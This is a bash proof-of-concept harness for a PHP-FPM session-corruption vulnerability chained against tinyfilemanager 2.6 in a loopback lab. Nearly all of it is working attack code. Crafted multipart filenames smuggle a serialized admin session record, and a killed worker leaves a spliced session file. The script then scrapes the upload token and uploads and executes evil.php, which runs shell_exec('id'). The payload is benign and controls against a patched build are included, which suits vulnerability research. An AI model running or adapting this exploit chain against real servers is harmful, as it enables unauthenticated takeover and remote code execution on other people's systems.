#!/bin/bash
# php2shell — CVE-2026-126714 (phpAfterShell) UNAUTHENTICATED splice, real-app
# consumer lane: tinyfilemanager 2.6 on loopback FastCGI. Same rfc1867
# carrier/replacement/kill geometry as php2shell-aftershell-splice-drupal.sh
# (wake 58), but the consumer is an application whose ENTIRE auth state is
# the native php session:
#   promoted record  filemanager|a:1:{s:6:"logged";s:5:"admin";}
# tinyfilemanager.php:352 accepts $_SESSION['filemanager']['logged'] when
# it is a key of $auth_users ('admin' is, default config) — no cookie
# token, no DB, no re-verification. From there the app's DESIGNED admin
# function is file management: upload evil.php through the app's own
# upload form (no extension allowlist by default, token scraped from the
# logged-in page) and request it; the live FPM worker executes the
# lab-chosen benign payload (unique marker print + `id` into the
# response and a marker file inside the lab tmpdir).
#
# Death is still the committed LD_PRELOAD kill shim (rung-4 mechanics) —
# the rung-5 attacker-caused death is a separate harness (stage 2).
#
# Differences from the Drupal harness, all forced by the consumer app:
# - session.use_cookies = 1 (tinyfilemanager never calls session_id();
#   PHP 8.4 ignores incoming cookie ids with use_cookies=0). Producers
#   still ride the multipart PHPSESSID form field (use_only_cookies=0).
# - the consumer cookie name is 'filemanager' (the app renames the
#   session at runtime; the pre-RINIT rfc1867 machinery still uses the
#   INI name PHPSESSID, as in the Drupal lane).
# - consumer needs QUERY_STRING=p= (the app redirects otherwise) and
#   HTTP_HOST.
#
# Usage: bash lab/repro/php2shell-aftershell-splice-tfm.sh <php-fpm-bin> <tfm-web> [outdir] [port]
#   <php-fpm-bin>: lab/build/php-8.4.27-app/sapi/fpm/php-fpm
#   <tfm-web>:     lab/src/php2shell-r5-app/tfm-app/web (provision-tfm-app.sh)

set -u
FPM=$(readlink -f "$1")
WEB=$(readlink -f "$2")
OUT=${3:-lab/build/evidence}
PORT=${PORT:-${4:-18134}}
BUILDDIR=$(dirname "$(dirname "$(dirname "$FPM")")")
LABEL=$(basename "$BUILDDIR" | sed 's/^php-//')-tfm
CLIENT=$(cd "$(dirname "$0")" && pwd)/php2shell-fpm-client.py
[ -f "$WEB/index.php" ] || { echo "no tinyfilemanager at $WEB (run provision-tfm-app.sh)"; exit 1; }
mkdir -p "$OUT"
LOG="$OUT/aftershell-tfm-$LABEL.log"
: > "$LOG"

REPOROOT=$(cd "$(dirname "$(dirname "$(dirname "$(readlink -f "$0")")")")" && pwd)
SO="$REPOROOT/lab/preload/aftershell-kill.so"
mkdir -p "$REPOROOT/lab/preload"
cc -shared -fPIC -O2 -o "$SO" "$REPOROOT/lab/php2shell/aftershell-kill.c" || {
    echo "cc failed"; exit 1; }

D=$(mktemp -d)
MTAG="php2shell-r5-$(date -u +%H%M%S)"
MARKER="$D/rce-marker-$MTAG.txt"
MPID=
cleanup() { [ -n "${KEEP_TMP:-}" ] || rm -rf "$D"; }
trap cleanup EXIT
SESS="$D/sess"; mkdir -p "$SESS"
FPMCONF="$D/fpm.conf"
SID="cafebabe00112233445566778899babe"
DUMP="$D/pwrites.bin"
ARM="$D/armed"
BOUNDARY='---------------------------20896060251896012921717172737'
KA2=""
HOST=127.0.0.1

OBJ='filemanager|a:1:{s:6:"logged";s:5:"admin";}'
X700=$(head -c 700 /dev/zero | tr "\0" "Y")
EVIL="$D/evil.php"
cat > "$EVIL" <<EOF
<?php
echo "PHP2SHELL-R5-MARKER:$MTAG\n";
echo shell_exec('id');
file_put_contents('$MARKER', "executed by pid ".getmypid()."\n".shell_exec('id'));
EOF
EVILLEN=$(wc -c < "$EVIL")

# ---------------------------------------------------------------- FPM config
cat > "$D/fpm.conf" <<EOF
[global]
error_log = $D/fpm-error.log
daemonize = no
log_level = notice
process_control_timeout = 5
pid = $D/fpm.pid

[www]
listen = 127.0.0.1:$PORT
pm = static
pm.max_children = 1
pm.max_requests = 0
catch_workers_output = yes
clear_env = no
php_admin_value[html_errors] = 0
php_admin_value[display_errors] = 1
php_admin_value[error_reporting] = 32767
php_admin_value[post_max_size] = 1G
php_admin_value[max_file_uploads] = 20
php_admin_value[file_uploads] = 1
php_admin_value[upload_max_filesize] = 8M
php_admin_value[memory_limit] = 512M
php_admin_value[session.save_handler] = files
php_admin_value[session.save_path] = $SESS
php_value[session.name] = PHPSESSID
php_admin_value[session.serialize_handler] = php
php_admin_value[session.use_strict_mode] = 0
php_admin_value[session.use_cookies] = 1
php_admin_value[session.use_only_cookies] = 0
php_admin_value[session.upload_progress.enabled] = 1
php_admin_value[session.upload_progress.cleanup] = 0
php_admin_value[session.upload_progress.prefix] = upload_progress_
php_admin_value[session.upload_progress.name] = PHP_SESSION_UPLOAD_PROGRESS
php_admin_value[session.upload_progress.freq] = 1%
php_admin_value[session.upload_progress.min_freq] = 0.000000001
EOF
{ echo "--- generated fpm.conf (tmpdir $D) ---"; cat "$D/fpm.conf"; echo "--- end fpm.conf ---"; } >> "$LOG"
echo "tfm consumer cookie: filemanager=$SID (host $HOST) marker=$MARKER" | tee -a "$LOG"

# ---------------------------------------------------------------- helpers
fcgi() { python3 "$CLIENT" "$PORT" "$@"; }
offset_of() {
    python3 -c 'import sys
d=open(sys.argv[1],"rb").read(); print(d.find(sys.argv[2].encode()))' "$1" "$2"
}
seg_after() {
    python3 -c 'import sys
d=open(sys.argv[1],"rb").read(); i=d.find(sys.argv[2].encode())
sys.stdout.buffer.write(d[i:] if i>=0 else b"")' "$1" "$2"
}
esc_fn() { printf %s "$1" | sed 's/\\/\\\\/g; s/"/\\"/g'; }
mpbody() { # $1 = progress key, $2 = raw filename
    printf -- "--%s\r\nContent-Disposition: form-data; name=\"PHPSESSID\"\r\n\r\n%s\r\n" "$BOUNDARY" "$SID"
    printf -- "--%s\r\nContent-Disposition: form-data; name=\"PHP_SESSION_UPLOAD_PROGRESS\"\r\n\r\n%s\r\n" "$BOUNDARY" "$1"
    printf -- "--%s\r\nContent-Disposition: form-data; name=\"file1\"; filename=\"%s\"\r\n\r\n1\r\n" "$BOUNDARY" "$(esc_fn "$2")"
    printf -- "--%s--\r\n" "$BOUNDARY"
}
post() { # $1 = progress key, $2 = raw filename -> a REAL tinyfilemanager request (no cookie)
    mpbody "$1" "$2" > "$D/body"
    fcgi "$WEB/index.php" --body "$D/body" \
        --param "QUERY_STRING=p=" --param "REQUEST_URI=/index.php?p=" \
        --param HTTP_HOST=$HOST --param SERVER_NAME=$HOST \
        --param CONTENT_TYPE="multipart/form-data; boundary=$BOUNDARY"
}
consumer() { # $1 = tag, $2 = sid (default attacker sid) -> tinyfilemanager GET as its own consumer
    local csid=${2:-$SID}
    fcgi "$WEB/index.php" \
        --param "QUERY_STRING=p=" --param "REQUEST_URI=/index.php?p=" \
        --param HTTP_HOST=$HOST --param SERVER_NAME=$HOST \
        --param HTTP_USER_AGENT=php2shell-lab \
        --param HTTP_COOKIE="filemanager=$csid"
}
uploadbody() { # $1 = token
    printf -- "--%s\r\nContent-Disposition: form-data; name=\"p\"\r\n\r\n\r\n" "$BOUNDARY"
    printf -- "--%s\r\nContent-Disposition: form-data; name=\"fullpath\"\r\n\r\nevil.php\r\n" "$BOUNDARY"
    printf -- "--%s\r\nContent-Disposition: form-data; name=\"token\"\r\n\r\n%s\r\n" "$BOUNDARY" "$1"
    printf -- "--%s\r\nContent-Disposition: form-data; name=\"dzchunkindex\"\r\n\r\n0\r\n" "$BOUNDARY"
    printf -- "--%s\r\nContent-Disposition: form-data; name=\"dztotalchunkcount\"\r\n\r\n0\r\n" "$BOUNDARY"
    printf -- "--%s\r\nContent-Disposition: form-data; name=\"file\"; filename=\"evil.php\"\r\nContent-Type: application/octet-stream\r\n\r\n" "$BOUNDARY"
    cat "$EVIL"
    printf "\r\n--%s--\r\n" "$BOUNDARY"
}
upload() { # $1 = token
    uploadbody "$1" > "$D/ubody"
    fcgi "$WEB/index.php" --body "$D/ubody" \
        --param "QUERY_STRING=p=" --param "REQUEST_URI=/index.php?p=" \
        --param HTTP_HOST=$HOST --param SERVER_NAME=$HOST \
        --param HTTP_USER_AGENT=php2shell-lab \
        --param HTTP_COOKIE="filemanager=$SID" \
        --param CONTENT_TYPE="multipart/form-data; boundary=$BOUNDARY"
}
execute_uploaded() { # GET /evil.php through the same FPM worker
    fcgi "$WEB/evil.php" \
        --param "QUERY_STRING=" --param "REQUEST_URI=/evil.php" \
        --param HTTP_HOST=$HOST --param SERVER_NAME=$HOST
}
wait_port() {
python3 - "$PORT" <<'PY'
import socket, sys, time
port = int(sys.argv[1])
for _ in range(100):
    try:
        with socket.create_connection(("127.0.0.1", port), timeout=1):
            sys.exit(0)
    except OSError:
        time.sleep(0.1)
sys.exit(1)
PY
}
child_pids() { pgrep -P "$MPID" 2>/dev/null || true; }
wait_child() {
    local i c
    for i in $(seq 1 100); do
        c=$(child_pids)
        if [ "$(echo "$c" | grep -c .)" = 1 ]; then echo "$c"; return 0; fi
        sleep 0.1
    done
    return 1
}
start_fpm() {
    stop_fpm
    fuser -k "$PORT"/tcp >/dev/null 2>&1 || true
    sleep 0.2
    (
        export LD_PRELOAD="$SO" \
               AFTERSHELL_LOG_FILE="$DUMP" AFTERSHELL_LOG_ONLY=1
        if [ -n "$KA2" ]; then
            export AFTERSHELL_KILL_AT="$KA2" AFTERSHELL_KILL_ARM="$ARM"
        fi
        exec "$FPM" -n -F -y "$FPMCONF"
    ) >> "$LOG" 2>&1 &
    MPID=$!
    wait_port || { echo "FPM failed to listen — inspect $LOG" | tee -a "$LOG"; exit 1; }
    CHILD=$(wait_child) || { echo "no worker child — inspect $LOG" | tee -a "$LOG"; exit 1; }
}
stop_fpm() {
    [ -n "$MPID" ] && kill "$MPID" 2>/dev/null
    [ -n "$MPID" ] && wait "$MPID" 2>/dev/null
    MPID=
}

# ---------------------------------------------------------------- carrier
# C = carrrec || objkrec(PAD+OBJ+PAD3 in filename) || tailrec;
# R = carrnew(long filename) || objkrec || tailrec, len(R) > len(C) so
# mod_files.c skips the truncate; cut K = len(carrnew).
build_carrier() { # $1 = PAD length before OBJ inside objk's filename
    rm -f "$SESS"/sess_* "$WEB/evil.php"
    local pad fn
    pad=$(head -c "$1" /dev/zero | tr '\0' 'A')
    fn="$pad$OBJ$(head -c 32 /dev/zero | tr '\0' 'B')"
    post carr "z"   >> "$LOG" 2>&1
    post objk "$fn" >> "$LOG" 2>&1
    post tail "z"   >> "$LOG" 2>&1
}

# ================================= phase 1: calibration + carrier alignment
start_fpm
echo "== FPM phase-1 master pid=$MPID label=$LABEL build=$BUILDDIR child=$CHILD $(date -u)" >> "$LOG"

build_carrier 100
rm -f "$DUMP"
post carr "$X700" >> "$LOG" 2>&1
K=$(python3 -c 'import sys
d=open(sys.argv[1],"rb").read()
i=d.find(b"=== pwrite"); j=d.find(b"\n", i) + 1
print(d.find(b"upload_progress_objk|", j) - j)' "$DUMP")
NW=$(python3 -c 'import re,sys
d=open(sys.argv[1],"rb").read(); m=re.search(rb"=== pwrite n=(\d+) ===",d)
print(m.group(1).decode() if m else "0")' "$DUMP")
echo "calibration: FILE_START write n=$NW, K(len of carrnew record)=$K" >> "$LOG"
if [ "$K" -le 0 ]; then
    echo "calibration FAILED (no objk record in FILE_START dump — inspect $LOG)" | tee -a "$LOG"
    KEEP_TMP=1 exit 1
fi

PADLEN=100
build_carrier "$PADLEN"
for i in 1 2 3 4 5 6; do
    M1=$(offset_of "$SESS/sess_$SID" 'filemanager|a:1:')
    DELTA=$((K - M1))
    echo "align pass $i: OBJ at $M1, target K=$K, delta=$DELTA (PAD1=$PADLEN)" >> "$LOG"
    [ "$DELTA" -eq 0 ] && break
    PADLEN=$((PADLEN + DELTA))
    build_carrier "$PADLEN"
done
M1=$(offset_of "$SESS/sess_$SID" 'filemanager|a:1:')
if [ "$M1" != "$K" ]; then
    echo "ALIGNMENT FAILED: OBJ at $M1, want $K — inspect $LOG" | tee -a "$LOG"
    KEEP_TMP=1 exit 1
fi
CARRIER="$D/carrier.bin"
cp "$SESS/sess_$SID" "$CARRIER"
echo "carrier aligned: OBJ at byte $M1 == K=$K, carrier size $(wc -c < "$CARRIER")" >> "$LOG"
LENR=$((NW))
LEN_C=$(wc -c < "$CARRIER")
echo "variant-A check: len(R_fs)=$LENR vs carrier size $LEN_C (must be >= or mod_files.c truncates first)" >> "$LOG"
if [ "$LENR" -lt "$LEN_C" ]; then
    echo "   len(R) < len(C) — harness invalid: pad the replacement filename" | tee -a "$LOG"
    KEEP_TMP=1 exit 1
fi

# sanity: the tfm consumer must start a session on a virgin sid
rm -f "$DUMP"
printf 'probe|a:1:{s:1:"x";i:1;}' > "$SESS/sess_aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa"
consumer SANITY aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa >> "$LOG" 2>&1
SAN_PID=$(grep -c '=== pwrite' "$DUMP" 2>/dev/null || echo 0)
echo "sanity consumer: pwrite-dump entries=$SAN_PID (session write by the app)" >> "$LOG"

stop_fpm

# ================================= phase 2: armed kill + respawn + consumer
KA2="$K"
start_fpm
OLDCHILD=$CHILD
echo "== FPM phase-2 master pid=$MPID KILL_AT=$K ARM=$ARM child=$OLDCHILD (armed)" >> "$LOG"

touch "$ARM"
post carr "$X700" >> "$LOG" 2>&1
RC=$?
rm -f "$ARM"
echo "kill-run rc=$RC (2 = FASTCGI_ERROR: worker died mid-request, expected)" >> "$LOG"
FILESZ=$(wc -c < "$SESS/sess_$SID")
echo "file-after-kill: $FILESZ bytes" >> "$LOG"
echo "  bytes-K-onward: $(seg_after "$SESS/sess_$SID" 'filemanager|a:1:' | head -c 60)" >> "$LOG"

NEWCHILD=$(wait_child) || { echo "master did NOT respawn a worker — inspect $LOG" | tee -a "$LOG"; KEEP_TMP=1 exit 1; }
echo "master respawned worker: old=$OLDCHILD new=$NEWCHILD" >> "$LOG"
[ "$NEWCHILD" = "$OLDCHILD" ] && echo "WARNING: same child pid — kill may not have fired" >> "$LOG"

MIXOK=0
python3 - "$SESS/sess_$SID" "$CARRIER" "$K" <<'EOF' >> "$LOG" 2>&1 && MIXOK=1
import sys
f = open(sys.argv[1], 'rb').read()
c = open(sys.argv[2], 'rb').read()
k = int(sys.argv[3])
ok = len(f) > k and f[k:] == c[k:] and f[k:k+44].startswith(b'filemanager|a:1:')
print(f"splice-check: filelen={len(f)} K={k} tail==carrier-tail:{f[k:]==c[k:]} obj-at-K:{f[k:k+44][:24]!r}")
sys.exit(0 if ok else 1)
EOF
[ "$MIXOK" = 1 ] && echo "  post-kill file state: k1new || C[K:] splice on disk" >> "$LOG" \
               || echo "  post-kill file state: NOT the splice (8.4.28: expected)" >> "$LOG"
[ "$FILESZ" = "$K" ] && echo "  (file size == K: ftruncate-first — vendor-fix behavior)" >> "$LOG"

# ---- consumer: RESPAWNED worker runs the REAL tinyfilemanager request
# with the spliced session; the app's own session decode is the consume path.
rm -f "$DUMP"
consumer A > "$D/consumerA.out" 2>&1
cat "$D/consumerA.out" >> "$LOG"
PROMOTED=0
python3 - "$DUMP" <<'EOF' >> "$LOG" 2>&1 && PROMOTED=1
import sys
d = open(sys.argv[1], 'rb').read()
ok = b'}filemanager|a:1:{s:6:"logged";s:5:"admin";}' in d   # record-boundary promotion, not inert string content
print(f"consumer-write-dump: promoted-evil-record:{ok} ({len(d)} bytes dumped)")
sys.exit(0 if ok else 1)
EOF
[ "$PROMOTED" = 1 ] && echo "   tfm consumer session WRITE re-encoded the promoted admin record" | tee -a "$LOG" \
                   || echo "   consumer write dump has NO evil record (see $LOG)" | tee -a "$LOG"

TAKEOVER=0
TOKEN=$(python3 -c 'import re,sys
d=open(sys.argv[1],"r",errors="replace").read()
m=re.search(r"name=\"token\" value=\"([0-9a-f]+)\"", d)
print(m.group(1) if m else "")' "$D/consumerA.out")
if [ -n "$TOKEN" ] && ! grep -q 'name="fm_usr"' "$D/consumerA.out"; then
    TAKEOVER=1
    echo "   SESSION TAKEOVER: tinyfilemanager accepted the promoted session as user 'admin' (token $TOKEN)" | tee -a "$LOG"
else
    echo "   no takeover: login form, no token (8.4.28/no-kill: expected)" | tee -a "$LOG"
fi

# ---- designed admin action: upload evil.php through the app's own form
EXECOK=0
if [ "$TAKEOVER" = 1 ]; then
    upload "$TOKEN" > "$D/upload.out" 2>&1
    cat "$D/upload.out" >> "$LOG"
    if grep -q '"status":"success"' "$D/upload.out"; then
        echo "   admin UPLOAD accepted by the app: $WEB/evil.php" | tee -a "$LOG"
        execute_uploaded > "$D/exec.out" 2>&1
        cat "$D/exec.out" >> "$LOG"
        if grep -q "PHP2SHELL-R5-MARKER:$MTAG" "$D/exec.out" && grep -q "uid=" "$D/exec.out"; then
            EXECOK=1
            echo "   COMMAND EXECUTION by the live worker: marker $MTAG printed, \`id\` output:" | tee -a "$LOG"
            grep "uid=" "$D/exec.out" | tee -a "$LOG"
        else
            echo "   /evil.php did NOT execute — inspect $LOG" | tee -a "$LOG"
        fi
    else
        echo "   upload REJECTED by the app — inspect $LOG" | tee -a "$LOG"
    fi
else
    upload "0" > "$D/upload.out" 2>&1
    cat "$D/upload.out" >> "$LOG"
    grep -q 'Token' "$D/upload.out" && echo "   control upload rejected (token invalid/missing), as expected" | tee -a "$LOG"
fi
[ -f "$MARKER" ] && { echo "   marker file $MARKER:"; cat "$MARKER"; } >> "$LOG"
MARKER_CONTENT=$(cat "$MARKER" 2>/dev/null || true)
echo "marker-file-present: $([ -n "$MARKER_CONTENT" ] && echo yes || echo no)" | tee -a "$LOG"

# ---- control: identical carrier + replacement WITHOUT the kill
build_carrier "$PADLEN"
post carr "$X700" >> "$LOG" 2>&1
echo "control-write rc=$?" >> "$LOG"
# ---- fixed-build app-health lane: PHP 8.4.28 adds the
# SESSION_CHECK_UPLOAD_PROGRESS_STATE guard (session.c:94-100) — runtime
# session ini changes THROW while session.upload_progress.enabled is On,
# so tinyfilemanager's session_cache_limiter() at line 231 fatals and the
# app cannot serve ANY request in the producer pool. The carrier for the
# no-kill control was rebuilt in the MAIN pool above (producers need
# upload_progress); consumer checks switch to an app-health pool with the
# progress ini off, same save_path. On 8.4.27 no fatal fires and the
# pool never switches.
GUARD=0
if grep -q "cannot be changed at runtime" "$D/consumerA.out" 2>/dev/null; then
    GUARD=1
    echo "   PHP 8.4.28 session-ini guard observed: app fatals in session_cache_limiter() while upload_progress is On (fix-series hardening)" | tee -a "$LOG"
    sed 's/^php_admin_value\[session.upload_progress.enabled\] = 1$/php_admin_value[session.upload_progress.enabled] = 0/' "$D/fpm.conf" > "$D/fpm2.conf"
    stop_fpm
    FPMCONF="$D/fpm2.conf"
    start_fpm
    echo "== FPM phase-2b app-health pool master pid=$MPID child=$CHILD (upload_progress off)" >> "$LOG"
fi
rm -f "$DUMP"
consumer CTL > "$D/consumerCTL.out" 2>&1
cat "$D/consumerCTL.out" >> "$LOG"
CTL_PROMOTED=0
python3 - "$DUMP" <<'EOF' >> "$LOG" 2>&1 && CTL_PROMOTED=1
import sys
d = open(sys.argv[1], 'rb').read()
ok = b'}filemanager|a:1:{s:6:"logged";s:5:"admin";}' in d
print(f"control-write-dump: has-evil-record:{ok}")
sys.exit(0 if ok else 1)
EOF
[ "$CTL_PROMOTED" = 1 ] && echo "   CONTROL UNEXPECTED: evil record without kill — harness invalid" | tee -a "$LOG" \
                       || echo "   control (no kill): no evil record in the app session write, as expected" | tee -a "$LOG"
CTL_TAKEOVER=0
grep -q 'name="fm_usr"' "$D/consumerCTL.out" || CTL_TAKEOVER=1
[ "$CTL_TAKEOVER" = 1 ] && echo "   CONTROL UNEXPECTED: logged-in page without the kill — inspect $LOG" | tee -a "$LOG" \
                       || echo "   control (no kill): login form, session takeover needs the interrupted write" | tee -a "$LOG"
if [ -f "$WEB/evil.php" ]; then
    echo "   CONTROL UNEXPECTED: evil.php present without takeover" | tee -a "$LOG"
fi
# safe-input control: virgin sid, no carrier, no kill
rm -f "$SESS"/sess_* "$WEB/evil.php"
consumer SAFE cccc00112233445566778899aabbcccc > "$D/consumerSAFE.out" 2>&1
grep -q 'name="fm_usr"' "$D/consumerSAFE.out" \
    && echo "   safe-input control (virgin sid): login form, no session, as expected" | tee -a "$LOG" \
    || echo "   safe-input control UNEXPECTED — inspect $LOG" | tee -a "$LOG"
if [ -f "$MARKER" ]; then
    if [ "$EXECOK" = 1 ]; then echo "   marker file present (from the executed payload)" | tee -a "$LOG"
    else echo "   CONTROL UNEXPECTED: marker file present without takeover+exec — harness invalid" | tee -a "$LOG"; fi
fi

# ---------------------------------------------------------------- verdict
echo "== verdict scan (log: $LOG)" | tee -a "$LOG"
[ "$MIXOK" = 1 ] && echo "   splice on disk before the consumer (k1new || C[K:])" | tee -a "$LOG" \
                  || echo "   post-kill file NOT the splice (8.4.28: expected)" | tee -a "$LOG"
[ "$PROMOTED" = 1 ] && echo "   UNAUTH PRODUCER -> REAL-APP CONSUMER: promoted admin record observed in the app session write" | tee -a "$LOG" \
                    || echo "   no promotion through the app (see $LOG)" | tee -a "$LOG"
[ "$TAKEOVER" = 1 ] && echo "   UNAUTH SESSION TAKEOVER of tinyfilemanager admin through the splice" | tee -a "$LOG" \
                    || echo "   no takeover (8.4.28/no-kill: expected)" | tee -a "$LOG"
[ "$EXECOK" = 1 ] && echo "   UNAUTH -> DESIGNED-ADMIN UPLOAD -> LIVE-WORKER COMMAND EXECUTION (marker $MTAG, shim kill = rung-4 mechanics)" | tee -a "$LOG" \
                   || echo "   no command execution (8.4.28/no-kill: expected)" | tee -a "$LOG"
grep -qE 'AddressSanitizer|runtime error:|SEGV|Assertion.*failed|SUMMARY' "$LOG" && \
    echo "   SANITIZER/ASSERT OUTPUT PRESENT — inspect $LOG" | tee -a "$LOG"
if [ -f "$D/fpm-error.log" ]; then
    echo "--- fpm-error.log ---" >> "$LOG"
    grep -E 'signal|exited|WARNING|ERROR' "$D/fpm-error.log" >> "$LOG" 2>/dev/null || true
fi
exit 0
